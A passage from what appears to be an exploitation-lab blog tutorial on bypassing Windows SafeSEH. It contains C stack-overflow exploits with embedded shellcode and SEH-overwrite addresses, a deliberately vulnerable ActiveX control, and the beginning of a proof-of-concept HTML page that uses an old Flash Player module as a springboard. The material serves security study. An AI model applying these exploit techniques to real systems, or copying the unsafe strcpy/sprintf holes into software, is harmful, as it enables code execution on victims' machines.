</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xEB\x0E\x90\x90</span><span class=s>&#34;</span> <span class=c1>// 220 Byte NOP, retn here, jmp to shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x81\x11\x12\x11</span><span class=s>&#34;</span> <span class=c1>// address of pop pop retn in No_SafeSEH module
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span> <span class=c1>// to prevent SEH chain stack overfill
</span></span></span><span class=line><span class=cl><span class=c1>// shellocode
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DWORD</span> <span class=nf>MyException</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;There is an exception&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>input</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>str</span><span class=p>,</span> <span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>zero</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// prevent overfill, palce it to strcpy back
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=kr>__try</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>zero</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>/</span> <span class=n>zero</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=kr>__except</span><span class=p>(</span><span class=n>MyException</span><span class=p>()){}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>HINSTANCE</span> <span class=n>hInst</span> <span class=o>=</span> <span class=n>LoadLibrary</span><span class=p>(</span><span class=n>TEXT</span><span class=p>(</span><span class=s>&#34;SEH_NOSafeSEH_JUMP.dll&#34;</span><span class=p>));</span> <span class=c1>// load No_SafeSEH module
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>test</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=experimental-ideas>Experimental ideas</h3><ul><li>Use VC6 to compile SEH_NOSafeSEH_JUMP.DLL, so that SEH_NOSafeSEH_JUMP.DLL will not enable SafeSEH, using release mode</li><li>Use VS2008 to compile SEH_NOSafeSEH.EXE, so that SEH_NOSafeSEH.EXE will be SafeSEH enabled, using release mode, and compile with no optimization settings.</li><li>The test function of SEH_NOSafeSEH.EXE has an obvious stack overflow vulnerability, which also requires that there be no zeros in the shellcode</li><li>SEH is overwritten to create a divide by 0 exception, hijacking the exception handling process</li></ul><h3 id=advance-processing>Advance processing</h3><ul><li>Since the default loading base address of the DLL compiled by <code>VC++ 6.0</code> is <code>0x10000000</code>, if it is used as the loading base address of the DLL, the address of the <code>pop pop retn</code> instruction in the DLL may contain <code>0x00</code>, which will truncate the string when we do strcpy operation and affect the copy of our shellcode, so in order to To facilitate the test we need to reset the base address. Select &ldquo;Project ‚Üí Settings&rdquo; in the top menu, then switch to the &ldquo;Connections&rdquo; tab and add <code>/base:" 0x11120000"</code> in the &ldquo;Project Options&rdquo; input box.</li></ul><h3 id=problems-encountered>Problems encountered</h3><ul><li>The springboard will jump to the first 4 bytes of the address in the shellcode, so you should put jmp here</li><li>The program compiled by <code>VS 2008</code> will press <code>-2</code> (<code>-1</code> under <code>VC++ 6.0</code>) at <code>Security Cookie+4</code> when it enters the function containing <code>__try{}</code>, and the program will press <code>-2</code> (<code>-1</code> under <code>VC++ 6.0</code>) when it enters the <code>__try{}</code> area according to the <code>__try{}</code> block is modified to a different value depending on the position of the <code>__try{}</code> block in the function. For example, if there are two <code>__try{}</code> blocks in the function, this value will be modified to <code>0</code> when entering the first <code>__try{}</code> block, and to <code>1</code> when entering the second. If an exception occurs in the <code>__try{}</code> block, the program will call the corresponding <code>__except()</code> to handle it based on this value, and the value in this position will be modified to <code>-2</code> again after the process is finished; if no exception occurs in the <code>__try{}</code> block, the value will also be modified back to <code>-2</code> when the program leaves the <code>__try{}</code> block. 2<code>. Of course there are other uses for this value in exception handling. We just need to know that our shellcode may be corrupted due to its presence, so we should put eight bytes of </code>NOP` after the module address as a protection measure.</li><li>There is a four-byte discordance between <code>retn</code> back to the stack address space and the shellcode body, so we need to jump to the shellcode and execute</li></ul><h2 id=bypass-safeseh-by-using-addresses-other-than-the-loaded-module>Bypass SafeSEH by using addresses other than the loaded module</h2><blockquote><p>SafeSEH is enabled by default for all modules</p></blockquote><h3 id=springboard>Springboard</h3><div class=table-wrapper><table><thead><tr><th>Address</th><th>Disassembly code</th></tr></thead><tbody><tr><td></td><td>call/jmpdword ptr[esp+0x8]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x14]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x1c]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x2c]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x44]</td></tr><tr><td></td><td>call/jmpdword ptr[esp+0x50]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp+0xc]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp+0x24]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp+0x30]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp-0x4]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp-0xc]</td></tr><tr><td></td><td>call/jmp dword ptr[ebp-0x18]</td></tr></tbody></table></div><h3 id=code-2>Code</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl><span class=c1>// shellcode start
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>// shellcode end
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span> <span class=c1>// will be overfile with 00000000 00000000 by {__try __catch}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xE9\x2B\xFF\xFF\xFF\x90\x90\x90</span><span class=s>&#34;</span> <span class=c1>// far jump and nop
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\xEB\xF6\x90\x90</span><span class=s>&#34;</span> <span class=c1>// short jump and nop &amp; return here
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s>&#34;</span><span class=se>\x0B\x0B\x29\x00</span><span class=s>&#34;</span> <span class=c1>// address of call [ebp+30] in outside memory
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DWORD</span> <span class=nf>MyException</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;There is an exception&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>input</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>str</span><span class=p>,</span> <span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>zero</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kr>__try</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>zero</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>/</span> <span class=n>zero</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=kr>__except</span><span class=p>(</span><span class=n>MyException</span><span class=p>()){}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>test</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=vulnerability-execution-flow>Vulnerability Execution Flow</h4><ul><li>Buffer overflow overrides SEH chain to handle addresses outside the module to bypass SafeSEH</li><li>A <code>call [ebp+0x30]</code> instruction is found at <code>0x00290B0B</code>, which is used as a springboard to jump into the shellcode</li></ul><p>Problems faced by ####</p><ul><li><code>0x00290B0B</code> contains byte <code>0x00</code>, strcpy copy will terminate when it encounters it</li></ul><blockquote><p>Solution: 00 can not be missing, let it become the end of shellcode</p></blockquote><ul><li>The same problem as in the previous section, the program compiled by <code>VS 2008</code>, when entering the function containing <code>__try{}</code> will be pressed into <code>-2</code> at the location of <code>Security Cookie+4</code>, it will destroy the shellcode, so we need to skip it, it will overwrite the location code written in, so We need to use the 12 bytes below it to jump to the entrance of the real shellcode, so we need to use two jumps to jump to the entrance, the first jump is to jump to the long jump, and the second long jump is to jump to the shellcode</li></ul><h3 id=using-adobe-flash-player-activex-control-to-bypass-safeseh>Using Adobe Flash Player ActiveX control to bypass SafeSEH</h3><h4 id=principle>Principle</h4><p>Actually this method is to bypass <code>SafeSEH</code> by using the browser version of the <code>SafeSEH</code> module which is not enabled. Flash Player ActiveX does not support <code>SafeSEH</code> in versions before <code>9.0.124</code>, so if we can find a suitable springboard address in this control, we can bypass SafeSEH completely.</p><ul><li>Flash plugin as a module to find the springboard, because it does not have SafeSEH enabled</li><li>We construct code modules that cause stack overflow vulnerabilities</li><li>Constructing a POC html page to call the vulnerable code we constructed</li><li>After our code module overflows and overwrites the SEH chain, it will jump to the Flash code springboard we have prepared</li><li>The shellcode from the Flash code springboard jumps into our stack area</li><li>The exploit is successful</li></ul><h4 id=code-3>code</h4><ul><li>Download <a class=link href=https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/IE7-WindowsXP-x86-chs.exe target=_blank rel=noopener>IE7-for-XP-x86-Chinese</a> installer</li><li>Download the <a class=link href=https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/flashplayer9r124_winax.exe target=_blank rel=noopener>Flash Player ActiveX <code>v9.0.124</code></a> installer</li><li>Create an MFC ActiveX control, I packaged a copy of the project I created here <a class=link href=https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/VulnerAX_SEH/VulnerAX_SEH_SRC.zip target=_blank rel=noopener>download</a></li><li>Detailed setup diagram</li></ul><p><img src=/Detailed%20setup%20diagram.png loading=lazy alt=BzaLDA.png></p><ul><li>Use Unicode character set, disable compile optimization option, use MFC in static library, compile with release version</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>void</span> <span class=n>CVulnerAX_SEHCtrl</span><span class=o>::</span><span class=n>test</span><span class=p>(</span><span class=n>LPCTSTR</span> <span class=n>str</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>//AFX_MANAGE_STATE(AfxGetStaticModuleState());
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// TODO: Âú®Ê≠§Ê∑ªÂä†Ë∞ÉÂ∫¶Â§ÑÁêÜÁ®ãÂ∫è‰ª£Á†Å
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;moeomu&#34;</span><span class=p>);</span> <span class=c1>//ÂÆö‰ΩçËØ•ÂáΩÊï∞ÁöÑÊ†áËÆ∞
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>char</span> <span class=n>dest</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>sprintf</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>UUID of <code>CVulnerAX_SEHCtrl's class information</code> in <code>VulnerAX_SEH.idl</code>: <code>ACA3927C-6BD1-4B4E-8697-72481279AAEC</code></li></ul><h4 id=other-steps>Other steps</h4><ul><li>Register the control: <code>Regsvr32 path \ control name.ocx</code></li><li>Once registered we can call our function from the web page in the following way</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>object</span> <span class=na>classid</span><span class=o>=</span><span class=s>&#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;test&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>object</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=s2>&#34;testest&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=trigger-vulnerability>Trigger vulnerability</h4><h5 id=constructing-poc-pages>Constructing POC pages</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>object</span> <span class=na>classid</span><span class=o>=</span><span class=s>&#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&#34;</span> <span class=na>codebase</span><span class=o>=</span><span class=s>&#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0&#34;</span> <span class=na>width</span><span class=o>=</span><span class=s>&#34;160&#34;</span> <span class=na>height</span><span class=o>=</span><span class=s>&#34;260&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>param</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;movie&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;1.swf&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>param</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;quality&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;high&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>embed</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;1.swf&#34;</span> <span class=na>quality</span><span class=o>=</span><span class=s>&#34;high&#34;</span> <span class=na>pluginspage</span><span class=o>=</span><span class=s>&#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;application/x-shockwave-flash&#34;</span> <span class=na>width</span><span class=o>=</span><span class=s>&#34;160&#34;</span> <span class=na>height</span><span class=o>=</span><span class=s>&#34;260&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>embed</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>object</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>object</span> <span class=na>classid</span><span class=o>=</span><span class=s>&#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;test&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>object</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>shellcode</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>54</span><span class=p>)</span>
